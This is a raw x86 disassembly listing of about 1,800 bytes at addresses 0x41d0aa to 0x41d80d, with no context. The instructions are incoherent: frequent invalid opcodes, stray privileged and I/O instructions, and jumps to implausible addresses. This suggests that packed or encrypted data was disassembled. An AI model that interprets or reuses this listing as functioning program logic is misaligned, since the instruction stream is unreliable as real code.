  41d0aa:	in     eax,0xe9
  41d0ac:	loopne 0x41d080
  41d0ae:	dec    ebx
  41d0af:	jne    0x41d0e1
  41d0b1:	test   al,0x70
  41d0b3:	inc    esi
  41d0b4:	mov    al,ds:0xd85d4d36
  41d0b9:	in     al,0xce
  41d0bb:	inc    ebx
  41d0bc:	(bad)  
  41d0bd:	mov    edi,0x2694c533
  41d0c2:	or     al,0x62
  41d0c4:	addr16 pop ecx
  41d0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0c7:	mov    ah,0xaa
  41d0c9:	popf   
  41d0ca:	scas   eax,DWORD PTR es:[edi]
  41d0cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0cc:	imul   edx,DWORD PTR ss:[ebx+0x68c77db0],0xffffffc1
  41d0d4:	ins    BYTE PTR es:[edi],dx
  41d0d5:	aad    0xa0
  41d0d7:	add    eax,0xfb0abca
  41d0dc:	clc    
  41d0dd:	jmp    0x2711:0x6de284ea
  41d0e4:	jecxz  0x41d105
  41d0e6:	outs   dx,BYTE PTR ds:[esi]
  41d0e7:	ds push 0xb474fb1e
  41d0ed:	adc    al,0x3d
  41d0ef:	sbb    al,0xd1
  41d0f1:	mov    dl,0xd7
  41d0f3:	push   esp
  41d0f4:	repnz xchg edx,eax
  41d0f6:	(bad)  
  41d0f7:	int    0xd8
  41d0f9:	xor    dl,dh
  41d0fb:	inc    ebp
  41d0fc:	imul   ebx,ecx,0xffffffd5
  41d0ff:	push   edx
  41d100:	aas    
  41d101:	aaa    
  41d102:	push   cs
  41d103:	inc    ecx
  41d104:	lahf   
  41d105:	push   es
  41d106:	xlat   BYTE PTR ds:[ebx]
  41d107:	ins    DWORD PTR es:[edi],dx
  41d108:	mov    ds:0xb0c0bc37,al
  41d10d:	lea    esi,[ebp-0x39ddfacc]
  41d113:	fstp   TBYTE PTR [ebx]
  41d115:	aad    0x35
  41d117:	adc    ecx,esp
  41d119:	xchg   BYTE PTR fs:[edi-0x11],al
  41d11d:	add    DWORD PTR [ecx],0x68
  41d120:	les    esi,FWORD PTR [ecx-0x75]
  41d123:	dec    edi
  41d124:	(bad)  
  41d125:	mov    ds:0x11be0ceb,eax
  41d12a:	repnz and ebx,ebx
  41d12d:	scas   eax,DWORD PTR es:[edi]
  41d12e:	adc    ecx,DWORD PTR [ecx+0x4387041d]
  41d134:	mov    ds:0x927fdb9,al
  41d139:	sbb    ch,BYTE PTR [ecx]
  41d13b:	fucom  st(2)
  41d13d:	loop   0x41d160
  41d13f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d140:	dec    ebx
  41d141:	sbb    ecx,ebx
  41d143:	ds adc al,0xcd
  41d146:	jmp    0x249dc7a8
  41d14b:	or     al,0x6b
  41d14d:	mov    bl,ah
  41d14f:	hlt    
  41d150:	and    eax,ebx
  41d152:	fadd   QWORD PTR [esi+0x49c7810b]
  41d158:	adc    BYTE PTR [esi],ah
  41d15a:	mov    bh,0x87
  41d15c:	mov    esi,DWORD PTR [eax-0x7fddf4e9]
  41d162:	jno    0x41d1bd
  41d164:	int3   
  41d165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d166:	jl     0x41d12a
  41d168:	jnp    0x41d104
  41d16a:	mov    ds:0x604a23fc,eax
  41d16f:	out    dx,al
  41d170:	or     al,0x52
  41d172:	mov    esi,0xbd94ef01
  41d177:	cmp    eax,0x370ef140
  41d17c:	jne    0x41d1f0
  41d17e:	xchg   BYTE PTR [eax+eiz*8],dh
  41d181:	int    0x56
  41d183:	jmp    0x66a5028
  41d188:	pusha  
  41d189:	mov    ebp,0x13535ad0
  41d18e:	cwde   
  41d18f:	ror    ecx,cl
  41d191:	mov    cs,WORD PTR es:[ecx]
  41d194:	and    ebp,DWORD PTR [eax]
  41d196:	std    
  41d197:	arpl   WORD PTR [ecx-0x1f781ad1],di
  41d19d:	jp     0x41d1ad
  41d19f:	and    al,0xac
  41d1a1:	call   0x6e742984
  41d1a6:	lsl    edi,WORD PTR [ebx+0x26]
  41d1aa:	dec    DWORD PTR [ebx]
  41d1ac:	jnp    0x41d1c0
  41d1ae:	out    dx,eax
  41d1af:	cdq    
  41d1b0:	aas    
  41d1b1:	fisub  DWORD PTR [edx]
  41d1b3:	(bad)  
  41d1b4:	fsub   QWORD PTR [ebp-0x46]
  41d1b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1b8:	dec    esi
  41d1b9:	lea    edi,[esi]
  41d1bb:	loop   0x41d179
  41d1bd:	sub    cl,ah
  41d1bf:	std    
  41d1c0:	cs sub al,0xf3
  41d1c3:	add    esi,edi
  41d1c5:	fcomp  DWORD PTR [esi]
  41d1c7:	mov    eax,ds:0x2aedff80
  41d1cc:	jnp    0x41d21f
  41d1ce:	nop
  41d1cf:	or     eax,0xfc0257f7
  41d1d4:	push   esi
  41d1d5:	mov    ds:0x5729621b,eax
  41d1da:	cli    
  41d1db:	or     ecx,ebp
  41d1dd:	jae    0x41d190
  41d1df:	mov    eax,ds:0x1c44a23c
  41d1e4:	add    dh,bl
  41d1e6:	fiadd  WORD PTR [edi]
  41d1e8:	dec    eax
  41d1e9:	int    0x6b
  41d1eb:	and    ebx,DWORD PTR [edx+0x5dc1cc50]
  41d1f1:	sahf   
  41d1f2:	inc    edx
  41d1f3:	push   ss
  41d1f4:	sbb    eax,eax
  41d1f6:	aaa    
  41d1f7:	int3   
  41d1f8:	dec    esi
  41d1f9:	sbb    bh,ah
  41d1fb:	ss retf 0x20c2
  41d1ff:	push   ds
  41d200:	push   ecx
  41d201:	retf   
  41d202:	shl    esi,cl
  41d204:	das    
  41d205:	mov    esp,0x88e1486c
  41d20a:	jno    0x41d19a
  41d20c:	stos   BYTE PTR es:[edi],al
  41d20d:	inc    eax
  41d20e:	(bad)  
  41d20f:	mov    dh,0x66
  41d211:	icebp  
  41d212:	(bad)  
  41d213:	cmp    BYTE PTR [edi+edx*1+0x48],bh
  41d217:	jmp    0x41d290
  41d219:	mov    ds:0x120de5e4,eax
  41d21e:	in     al,dx
  41d21f:	mul    dl
  41d221:	test   al,0x15
  41d223:	xor    bl,BYTE PTR ds:0x14d4203e
  41d229:	push   ecx
  41d22a:	mov    al,0xcb
  41d22c:	xor    cl,BYTE PTR [ecx+0xea7cc0f]
  41d232:	push   ebx
  41d233:	fmul   st(0),st
  41d235:	aad    0xfc
  41d237:	jmp    0xc0f00420
  41d23c:	out    dx,eax
  41d23d:	xchg   edx,eax
  41d23e:	fwait
  41d23f:	lods   al,BYTE PTR ds:[esi]
  41d240:	fxch   st(7)
  41d242:	mov    ebp,0x9b9bf9f
  41d247:	mov    esi,0x400e877f
  41d24c:	int    0xa1
  41d24e:	xor    ah,BYTE PTR [edx-0x72]
  41d251:	daa    
  41d252:	sar    dl,cl
  41d254:	(bad)  
  41d256:	pop    ebx
  41d257:	jnp    0x41d275
  41d259:	sub    BYTE PTR [ebp-0x7],ah
  41d25c:	fldenv [esi]
  41d25e:	arpl   WORD PTR [edx],sp
  41d260:	out    0xb1,al
  41d262:	cwde   
  41d263:	sub    eax,0x6781c529
  41d268:	dec    esi
  41d269:	and    eax,0x220395d2
  41d26e:	push   ss
  41d26f:	pop    es
  41d270:	gs sti 
  41d272:	mov    ecx,0x78fb81f8
  41d277:	cli    
  41d278:	pop    esi
  41d279:	pop    eax
  41d27a:	iret   
  41d27b:	aas    
  41d27c:	cmp    dl,BYTE PTR [ebx]
  41d27e:	mov    bh,0xc4
  41d280:	aad    0xd9
  41d282:	dec    edi
  41d283:	pushf  
  41d284:	lds    edx,FWORD PTR [esi+eax*1]
  41d287:	out    0x36,al
  41d289:	out    0x4a,al
  41d28b:	and    esi,edi
  41d28d:	mov    cl,0xb4
  41d28f:	stc    
  41d290:	cmp    eax,0x28532772
  41d295:	std    
  41d296:	stos   DWORD PTR es:[edi],eax
  41d297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d298:	(bad)  
  41d299:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d29a:	xchg   DWORD PTR [edi+0x3f],esi
  41d29d:	sti    
  41d29e:	call   0x36f:0x95739b75
  41d2a5:	cmp    BYTE PTR [esi+edx*8+0x490b1d2b],cl
  41d2ac:	rol    al,cl
  41d2ae:	mov    gs,WORD PTR [eax+0x22]
  41d2b1:	adc    eax,esi
  41d2b3:	adc    eax,0x8524c3c8
  41d2b8:	aaa    
  41d2b9:	sub    al,dl
  41d2bb:	xchg   esp,eax
  41d2bc:	or     al,0xf
  41d2be:	call   0x8681c2f5
  41d2c3:	mov    gs,WORD PTR [edi-0x36]
  41d2c6:	xor    BYTE PTR [esi-0x7f455c94],ah
  41d2cc:	jno    0x41d30b
  41d2ce:	neg    DWORD PTR [edi-0x57049d6a]
  41d2d4:	mov    dh,0xb
  41d2d6:	gs jg  0x41d26f
  41d2d9:	sbb    eax,0xb65d3f71
  41d2de:	in     eax,dx
  41d2df:	test   BYTE PTR [edi-0x50],dh
  41d2e2:	pop    ebx
  41d2e3:	outs   dx,DWORD PTR ds:[esi]
  41d2e4:	jl     0x41d2d1
  41d2e6:	xor    esp,DWORD PTR [eax]
  41d2e8:	test   al,0x54
  41d2ea:	aaa    
  41d2eb:	clc    
  41d2ec:	mov    bl,0x44
  41d2ee:	jp     0x41d2b6
  41d2f0:	hlt    
  41d2f1:	push   0xffffffff
  41d2f3:	scas   al,BYTE PTR es:[edi]
  41d2f4:	ins    DWORD PTR es:[edi],dx
  41d2f5:	inc    BYTE PTR [esi]
  41d2f7:	jnp    0x41d27a
  41d2f9:	bound  ebx,QWORD PTR ds:0xccd4a96e
  41d2ff:	nop
  41d300:	jmp    0x41d2d8
  41d302:	(bad)  [ecx]
  41d304:	add    ebx,ebp
  41d306:	ss mov esp,ebx
  41d309:	jp     0x41d30c
  41d30b:	scas   eax,DWORD PTR es:[edi]
  41d30c:	push   esi
  41d30d:	test   DWORD PTR [edx+0x71],0xab4fd9e4
  41d314:	mov    ch,0x78
  41d316:	push   edi
  41d317:	inc    ebp
  41d318:	mov    eax,ds:0x364c4f13
  41d31d:	(bad)  
  41d31e:	lods   eax,DWORD PTR ds:[esi]
  41d31f:	int    0x86
  41d321:	push   ds
  41d322:	pop    eax
  41d323:	repnz add al,dl
  41d326:	and    ecx,DWORD PTR [edi+0x8]
  41d329:	inc    ebp
  41d32a:	int    0xb5
  41d32c:	adc    DWORD PTR [ebx+edi*4-0x6214dd6e],ebx
  41d333:	das    
  41d334:	sub    BYTE PTR gs:[ebp-0x4a9de4bb],bh
  41d33b:	sub    dl,BYTE PTR [eax+ebx*4-0x59]
  41d33f:	pop    ebx
  41d340:	(bad)  
  41d342:	out    dx,eax
  41d343:	mov    bh,0xae
  41d345:	(bad)  
  41d346:	mov    ecx,0x50967112
  41d34b:	sub    DWORD PTR [edx+0x13],esi
  41d34e:	cmp    dh,0xa7
  41d351:	and    ebx,DWORD PTR [esi+0x2653eb7a]
  41d357:	fcom   DWORD PTR [ecx+0xd663219]
  41d35d:	outs   dx,DWORD PTR ds:[esi]
  41d35e:	jo     0x41d37a
  41d360:	mov    edx,0x14bb70aa
  41d365:	enter  0xda12,0x93
  41d369:	add    al,0x60
  41d36b:	(bad)  
  41d36c:	mov    ch,0x50
  41d36e:	push   eax
  41d36f:	ss aaa 
  41d371:	xchg   ebx,eax
  41d372:	lock and ch,0xd
  41d376:	cld    
  41d377:	push   esp
  41d378:	dec    eax
  41d379:	mov    edx,0x3f228726
  41d37e:	stos   BYTE PTR es:[edi],al
  41d37f:	dec    esp
  41d380:	test   BYTE PTR [eax-0x6c],dh
  41d383:	clc    
  41d384:	fwait
  41d385:	mov    esi,0x1d2528e6
  41d38a:	popf   
  41d38b:	ins    BYTE PTR es:[edi],dx
  41d38c:	and    dh,BYTE PTR [edx+0x79]
  41d38f:	retf   
  41d390:	pop    ds
  41d391:	sub    DWORD PTR [eax-0x71],ebx
  41d394:	xchg   ebx,eax
  41d395:	sbb    DWORD PTR ds:0xcfa8aedb,esi
  41d39b:	sub    BYTE PTR [ecx+0x45],ch
  41d39e:	cmp    BYTE PTR [edi],bl
  41d3a0:	daa    
  41d3a1:	pop    esi
  41d3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3a3:	(bad)  
  41d3a4:	outs   dx,DWORD PTR ds:[esi]
  41d3a5:	push   esp
  41d3a6:	add    DWORD PTR [edi],edx
  41d3a8:	mov    WORD PTR [ecx],ss
  41d3aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3ab:	in     al,dx
  41d3ac:	inc    esi
  41d3ad:	adc    al,0x8d
  41d3af:	dec    edi
  41d3b0:	cmp    al,0x31
  41d3b2:	xor    eax,0xe46814e7
  41d3b7:	jno    0x41d371
  41d3b9:	xchg   edi,eax
  41d3ba:	mov    esi,0x2870dd3b
  41d3bf:	rcl    BYTE PTR [ebp-0x296d7592],1
  41d3c5:	imul   edx,DWORD PTR [ebp-0x4e],0xe629f97f
  41d3cc:	jp     0x41d42b
  41d3ce:	pop    edx
  41d3cf:	mov    al,ds:0xc4aee131
  41d3d4:	xor    eax,0x487548ba
  41d3d9:	aaa    
  41d3da:	cs pop ecx
  41d3dc:	push   eax
  41d3dd:	fisttp DWORD PTR [edx+0x6ee08b6]
  41d3e3:	je     0x41d427
  41d3e5:	push   ds
  41d3e6:	cwde   
  41d3e7:	jbe    0x41d3e1
  41d3e9:	ret    0x3103
  41d3ec:	es push ecx
  41d3ee:	xor    eax,DWORD PTR [ecx+0x23683e96]
  41d3f4:	not    bl
  41d3f6:	nop
  41d3f7:	std    
  41d3f8:	in     al,0xcb
  41d3fa:	imul   esp,ebx,0x3a4fb3d3
  41d400:	jb     0x41d472
  41d402:	jno    0x41d43d
  41d404:	and    edi,0x9b38bac5
  41d40a:	xor    BYTE PTR [edi],dh
  41d40c:	mov    edi,0xf9594a1f
  41d411:	dec    ebx
  41d412:	rcr    DWORD PTR cs:[eax-0x1],0x5a
  41d417:	cmp    ah,BYTE PTR [esi+0x5b]
  41d41a:	stos   DWORD PTR es:[edi],eax
  41d41b:	push   ss
  41d41c:	inc    BYTE PTR [eax+esi*2+0x7a]
  41d420:	pusha  
  41d421:	bound  edi,QWORD PTR [edi]
  41d423:	test   BYTE PTR [ecx+0x1a],dl
  41d426:	stos   BYTE PTR es:[edi],al
  41d427:	mov    bh,0xcf
  41d429:	lods   eax,DWORD PTR ds:[esi]
  41d42a:	sbb    DWORD PTR [edi+ebp*2],ecx
  41d42d:	mov    ds:0x7d863199,al
  41d432:	hlt    
  41d433:	ss lahf 
  41d435:	sub    dh,al
  41d437:	cmp    ebp,DWORD PTR [edx]
  41d439:	cmp    BYTE PTR [edx+0x66d2328c],cl
  41d43f:	push   ecx
  41d440:	mov    edx,0x635e523c
  41d445:	add    ebp,ebp
  41d447:	test   al,0x60
  41d449:	jo     0x41d3dd
  41d44b:	add    al,0x94
  41d44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d44e:	push   edx
  41d44f:	mov    ecx,0x7d8ec399
  41d454:	inc    ebp
  41d455:	xor    eax,0x425875f0
  41d45a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d45b:	into   
  41d45c:	sbb    esi,DWORD PTR [ebx+0x752b6f1b]
  41d462:	les    esp,FWORD PTR [esi+0x65]
  41d465:	mov    BYTE PTR [ecx],ah
  41d467:	mov    ds:0x36223916,eax
  41d46c:	mov    ds:0x15c9dbaa,al
  41d471:	add    ah,BYTE PTR [edx-0x2a]
  41d474:	xchg   esi,eax
  41d475:	mov    bh,0x92
  41d477:	cmc    
  41d478:	pop    ds
  41d479:	sub    eax,0xcc98e35b
  41d47e:	popf   
  41d47f:	sbb    DWORD PTR [eax+eiz*8],esi
  41d482:	mov    al,ds:0x8b6fd173
  41d487:	jmp    0xbc638c57
  41d48c:	inc    DWORD PTR [ebx-0x1a1ce49f]
  41d492:	push   0x27
  41d494:	xchg   esi,eax
  41d495:	retf   
  41d496:	mov    fs,WORD PTR [edx]
  41d498:	les    edi,FWORD PTR [ecx]
  41d49a:	ror    DWORD PTR [edi-0x19dd2477],1
  41d4a0:	sub    DWORD PTR [ebx+edx*2-0x34],edi
  41d4a4:	je     0x41d4c7
  41d4a6:	test   eax,0x75389258
  41d4ab:	lds    ecx,FWORD PTR [esi+0xfcc9dae]
  41d4b1:	xchg   ebp,eax
  41d4b2:	dec    eax
  41d4b3:	bound  ebx,QWORD PTR [ecx]
  41d4b5:	je     0x41d448
  41d4b7:	mov    bh,0x1b
  41d4b9:	sub    ebx,DWORD PTR [ebp-0x3dfb17be]
  41d4bf:	adc    cl,ah
  41d4c1:	sahf   
  41d4c2:	ret    0x671d
  41d4c5:	xor    DWORD PTR [ecx+0x38],ebx
  41d4c8:	inc    esi
  41d4c9:	jge    0x41d4c1
  41d4cb:	xchg   edx,eax
  41d4cc:	mov    ds:0x1e91450a,al
  41d4d1:	mov    WORD PTR [edi+0x22d41e61],ss
  41d4d7:	jl     0x41d545
  41d4d9:	inc    ecx
  41d4da:	ds data16 aam 0x2a
  41d4de:	cmp    ecx,DWORD PTR [esi+0x59]
  41d4e1:	inc    ecx
  41d4e2:	iret   
  41d4e3:	push   0x497bbe03
  41d4e8:	stos   DWORD PTR es:[edi],eax
  41d4e9:	mov    ebp,0xb6df8907
  41d4ee:	in     eax,0x0
  41d4f0:	ss sub esp,ecx
  41d4f3:	sub    DWORD PTR [ecx],ebx
  41d4f5:	pop    es
  41d4f6:	mov    al,ds:0xbe2ec760
  41d4fb:	mov    DWORD PTR [ebp+0x6b],esi
  41d4fe:	and    BYTE PTR [ebx],dh
  41d500:	pop    ss
  41d501:	add    DWORD PTR [edx-0x2a],0x5cd2117e
  41d508:	mov    BYTE PTR [eax+0x545c4214],ch
  41d50e:	mov    eax,ds:0x771a075f
  41d513:	aaa    
  41d514:	cdq    
  41d515:	dec    esi
  41d516:	xor    DWORD PTR [edx],0xffffffeb
  41d519:	xor    DWORD PTR [edi],0x578096be
  41d51f:	mov    eax,0x48f9be28
  41d524:	sub    eax,0x2d16bdbf
  41d529:	or     al,0x66
  41d52b:	shl    edx,1
  41d52d:	call   FWORD PTR ds:0xba000609
  41d533:	jb     0x41d4ba
  41d535:	into   
  41d536:	addr16 jp 0x41d53e
  41d539:	in     al,0xb4
  41d53b:	fstp   DWORD PTR [ebx+0x6a]
  41d53e:	sbb    BYTE PTR [esi+0x4ed820fa],0xf1
  41d545:	sbb    eax,0xc80b57fa
  41d54a:	addr16 xchg ebp,eax
  41d54c:	div    DWORD PTR [eax-0x32]
  41d54f:	ds inc edx
  41d551:	mov    ah,0x42
  41d553:	dec    edi
  41d554:	mov    bh,0xb
  41d556:	sbb    DWORD PTR [edx],ebx
  41d558:	dec    eax
  41d559:	push   0xd7949939
  41d55e:	jns    0x41d56f
  41d560:	adc    DWORD PTR [esi+0x18],0xffffffd2
  41d564:	and    eax,0x48c9fed7
  41d569:	xchg   esp,eax
  41d56a:	xchg   esi,eax
  41d56b:	mov    ch,0x32
  41d56d:	rcl    cl,cl
  41d56f:	pop    ebp
  41d570:	dec    ecx
  41d571:	rcl    dh,0xf3
  41d574:	lea    eax,[edx+0x541509a5]
  41d57a:	fldenv ds:[ecx]
  41d57d:	jge    0x41d5a6
  41d57f:	add    eax,edi
  41d581:	ins    DWORD PTR es:[edi],dx
  41d582:	jae    0x41d5f9
  41d584:	pop    edx
  41d585:	mov    ebp,DWORD PTR [eax]
  41d587:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d588:	sbb    eax,0xad5e18b
  41d58d:	addr16 jmp 0x778c4bd1
  41d593:	call   0xda793284
  41d598:	pinsrw mm7,WORD PTR [edx-0x16],0x2
  41d59d:	lahf   
  41d59e:	mov    edx,0x1e097c01
  41d5a3:	ja     0x41d61d
  41d5a5:	(bad)  
  41d5a6:	push   ds
  41d5a7:	aam    0x3c
  41d5a9:	mov    eax,ds:0x5f4b8bda
  41d5ae:	mov    esi,0xbb0762ed
  41d5b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5b4:	test   ah,cl
  41d5b6:	xor    DWORD PTR [edi-0x67],ebx
  41d5b9:	jmp    0x3c5d:0xb42c5a53
  41d5c0:	mov    ds:0x9eef6778,al
  41d5c5:	xchg   edx,eax
  41d5c6:	ret    0xd7be
  41d5c9:	cld    
  41d5ca:	leave  
  41d5cb:	popa   
  41d5cc:	or     BYTE PTR [ebx],ah
  41d5ce:	in     eax,dx
  41d5cf:	and    ch,BYTE PTR [esi]
  41d5d1:	pslld  mm4,mm6
  41d5d4:	cmp    DWORD PTR [ebp-0x35],esp
  41d5d7:	out    dx,eax
  41d5d8:	mov    ebp,0xe35c47e7
  41d5dd:	sar    dl,0x4a
  41d5e0:	cmp    al,0x79
  41d5e2:	mov    ch,0x93
  41d5e4:	inc    ebp
  41d5e5:	js     0x41d5f5
  41d5e7:	adc    edx,DWORD PTR [ecx+0x9]
  41d5ea:	or     DWORD PTR [ebx],esi
  41d5ec:	xor    eax,0xb90d6f97
  41d5f1:	and    DWORD PTR [edx],esp
  41d5f3:	push   ebp
  41d5f4:	es add ah,bh
  41d5f7:	cmp    esi,DWORD PTR [edi]
  41d5f9:	adc    BYTE PTR [eax-0x606d15da],bl
  41d5ff:	mov    ch,0x19
  41d601:	imul   edx,DWORD PTR ss:[edi-0x8acc0a],0xffffff9b
  41d609:	and    eax,0xecd463e
  41d60e:	add    DWORD PTR [ebp+0x54],esi
  41d611:	test   BYTE PTR [esi+0x28],bh
  41d614:	cmp    BYTE PTR [ebp+0x4a],dl
  41d617:	retf   0xdf17
  41d61a:	hlt    
  41d61b:	mov    dh,cl
  41d61d:	loopne 0x41d686
  41d61f:	jns    0x41d64f
  41d621:	scas   al,BYTE PTR es:[edi]
  41d622:	rcl    BYTE PTR [ebp-0xd],0x36
  41d626:	inc    esp
  41d627:	mov    bl,0x1f
  41d629:	aam    0x50
  41d62b:	retf   
  41d62c:	sub    DWORD PTR [edi],ecx
  41d62e:	idiv   DWORD PTR [ebx*4-0x1f21778d]
  41d635:	shrd   ecx,ebp,cl
  41d638:	adc    ch,dh
  41d63a:	jbe    0x41d5e2
  41d63c:	or     al,0xbe
  41d63e:	cwde   
  41d63f:	xchg   esp,eax
  41d640:	mov    ebp,0x61ded6d2
  41d645:	or     cl,BYTE PTR [ebx+0x47]
  41d648:	fcomi  st,st(6)
  41d64a:	stos   DWORD PTR es:[edi],eax
  41d64b:	dec    esp
  41d64c:	fst    DWORD PTR [edi]
  41d64e:	mov    cl,0x18
  41d650:	jle    0x41d5ec
  41d652:	imul   eax,ebp,0x9082a92e
  41d658:	retf   0xf4b3
  41d65b:	jb     0x41d5eb
  41d65d:	or     eax,DWORD PTR [ebp+0x43cdd6d4]
  41d663:	popf   
  41d664:	imul   edx,DWORD PTR [ebx],0x14
  41d667:	pushf  
  41d668:	xor    ch,BYTE PTR [edi+0x33]
  41d66b:	mov    edx,0x307d606
  41d670:	int    0x13
  41d672:	aaa    
  41d673:	stc    
  41d674:	jl     0x41d6be
  41d676:	and    al,BYTE PTR [esi+0x69080ba0]
  41d67c:	mov    ebx,0xd2dcd4b9
  41d681:	dec    BYTE PTR [edi+0x18549901]
  41d687:	gs repnz hlt 
  41d68a:	rcl    BYTE PTR [ecx],1
  41d68c:	into   
  41d68d:	daa    
  41d68e:	mov    ch,0xe3
  41d690:	dec    eax
  41d691:	inc    ebx
  41d692:	cmc    
  41d693:	(bad)  
  41d694:	fcmovne st,st(2)
  41d696:	jecxz  0x41d630
  41d698:	add    DWORD PTR [ebp-0x3185e252],ebp
  41d69e:	std    
  41d69f:	jl     0x41d675
  41d6a1:	cli    
  41d6a2:	or     bl,ch
  41d6a4:	sar    eax,1
  41d6a6:	sub    ch,bl
  41d6a8:	out    dx,al
  41d6a9:	add    eax,0xba385ba6
  41d6ae:	je     0x41d66e
  41d6b0:	shl    DWORD PTR [ecx-0x4b],1
  41d6b3:	vunpcklps ymm5,ymm5,ymm6
  41d6b7:	repnz in eax,0x82
  41d6ba:	inc    ebx
  41d6bb:	add    BYTE PTR [edi-0x7a],ah
  41d6be:	add    DWORD PTR [ebx],edx
  41d6c0:	pop    edx
  41d6c1:	push   0xab22f1ae
  41d6c6:	jp     0x41d707
  41d6c8:	lea    esp,[esp+edi*2]
  41d6cb:	jp     0x41d698
  41d6cd:	cmp    BYTE PTR ds:0xecc163d5,al
  41d6d3:	jb     0x41d670
  41d6d5:	pop    ebp
  41d6d6:	sbb    ecx,DWORD PTR [eax]
  41d6d8:	pop    ecx
  41d6d9:	cmp    DWORD PTR [edi+esi*8-0x29471bbc],eax
  41d6e0:	or     dl,BYTE PTR [ebp+0x7e]
  41d6e3:	add    BYTE PTR [edx],cl
  41d6e5:	(bad)  
  41d6e6:	test   BYTE PTR [ebx-0x674179da],0x51
  41d6ed:	call   0x3e771fe5
  41d6f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6f4:	inc    eax
  41d6f5:	xor    BYTE PTR ds:0xb3ebd745,0x15
  41d6fc:	outs   dx,BYTE PTR ds:[esi]
  41d6fd:	add    ebx,DWORD PTR ds:0x69cdb67a
  41d703:	scas   eax,DWORD PTR es:[edi]
  41d704:	add    ebp,ebp
  41d706:	pop    esi
  41d707:	mov    ah,0x96
  41d709:	rcr    DWORD PTR [edi+edx*4-0x15],0x23
  41d70e:	pop    ebp
  41d70f:	les    ebp,FWORD PTR [edx]
  41d711:	loope  0x41d74c
  41d713:	cli    
  41d714:	mov    ch,0x48
  41d716:	sbb    al,0x9c
  41d718:	les    eax,FWORD PTR [edi-0x41b1089b]
  41d71e:	pop    ecx
  41d71f:	lahf   
  41d720:	rdpmc  
  41d722:	jg     0x41d6d9
  41d724:	mov    esp,0xe7e9cc5f
  41d729:	data16 into 
  41d72b:	xchg   ebp,eax
  41d72c:	fsub   st,st(0)
  41d72e:	or     dl,al
  41d730:	repz mov esp,0xf3dbca8a
  41d736:	xchg   DWORD PTR [esi],eax
  41d738:	jnp    0x41d721
  41d73a:	mov    edx,0x753a94ff
  41d73f:	push   edx
  41d740:	sbb    cl,BYTE PTR [edx]
  41d742:	aad    0xdb
  41d744:	stos   BYTE PTR es:[edi],al
  41d745:	popf   
  41d746:	jne    0x41d7b4
  41d748:	sahf   
  41d749:	scas   al,BYTE PTR es:[edi]
  41d74a:	fcomp  DWORD PTR [ebx+0x64d529e1]
  41d750:	jo     0x41d771
  41d752:	in     eax,0xc9
  41d754:	jo     0x41d776
  41d756:	adc    ebx,DWORD PTR [ebx]
  41d758:	jmp    0x41d7c6
  41d75a:	lods   al,BYTE PTR ds:[esi]
  41d75b:	dec    ebx
  41d75c:	or     DWORD PTR [ecx-0x78],edi
  41d75f:	imul   esp,DWORD PTR [esi+eax*4+0x7efdb09e],0x8514f5b0
  41d76a:	sbb    edx,DWORD PTR [esp+ecx*8]
  41d76d:	mov    bh,0xc5
  41d770:	ret    0xac7f
  41d773:	scas   al,BYTE PTR es:[edi]
  41d774:	(bad)  
  41d775:	mov    al,0xca
  41d777:	adc    al,0xfb
  41d779:	sbb    eax,edx
  41d77b:	sub    al,0xa1
  41d77d:	mov    eax,0xcdd78cdb
  41d782:	cmc    
  41d783:	cmp    BYTE PTR [ebp-0x5f],dh
  41d786:	or     BYTE PTR [edi+0x8],ch
  41d789:	stos   BYTE PTR es:[edi],al
  41d78a:	mov    ch,0xa3
  41d78c:	pop    eax
  41d78d:	mov    ds:0xfc4902d9,eax
  41d792:	pop    ss
  41d793:	push   cs
  41d794:	lods   eax,DWORD PTR ds:[esi]
  41d795:	xchg   edx,eax
  41d796:	adc    edi,esi
  41d798:	sbb    DWORD PTR [ebx+edi*8],0xffffff9e
  41d79c:	inc    ecx
  41d79d:	inc    ecx
  41d79e:	cs jg  0x41d737
  41d7a1:	inc    esi
  41d7a2:	ss aas 
  41d7a4:	jecxz  0x41d7c9
  41d7a6:	das    
  41d7a7:	jecxz  0x41d78a
  41d7a9:	outs   dx,BYTE PTR ds:[esi]
  41d7aa:	mov    bl,0x6d
  41d7ac:	into   
  41d7ad:	xchg   edi,eax
  41d7ae:	data16 mov edx,db7
  41d7b2:	sub    DWORD PTR [ebx-0x76b33ece],edi
  41d7b8:	cs mov dh,al
  41d7bb:	jmp    0x22ce7485
  41d7c0:	adc    BYTE PTR [ecx+0x1395f5d9],0xa5
  41d7c7:	rcr    BYTE PTR [eax-0x6],1
  41d7ca:	icebp  
  41d7cb:	js     0x41d798
  41d7cd:	and    DWORD PTR [ebp-0x4e914787],eax
  41d7d3:	test   BYTE PTR [edi-0x4a],dh
  41d7d6:	sbb    dh,dh
  41d7d8:	test   al,0xb9
  41d7da:	rcl    DWORD PTR [eax-0x4d849c0b],0x43
  41d7e1:	(bad)  
  41d7e2:	out    dx,al
  41d7e3:	ins    BYTE PTR es:[edi],dx
  41d7e4:	xchg   BYTE PTR [ecx+0x79],bl
  41d7e7:	(bad)  
  41d7e9:	sub    BYTE PTR [ecx+edx*1+0x2225b70b],ah
  41d7f0:	data16 test BYTE PTR [ecx-0x42],bl
  41d7f4:	(bad)  [esi]
  41d7f6:	(bad)  
  41d7f8:	scas   eax,DWORD PTR es:[edi]
  41d7f9:	push   edi
  41d7fa:	dec    edx
  41d7fb:	in     al,dx
  41d7fc:	mov    WORD PTR [eax],fs
  41d7fe:	pop    ebp
  41d7ff:	data16 fwait
  41d801:	xor    al,0x8f
  41d803:	popa   
  41d804:	sbb    eax,0xaa83f972
  41d809:	fldenv [ecx+0x1e]
  41d80c:	pusha  
  41d80d:	mov    eax,0xe2899177
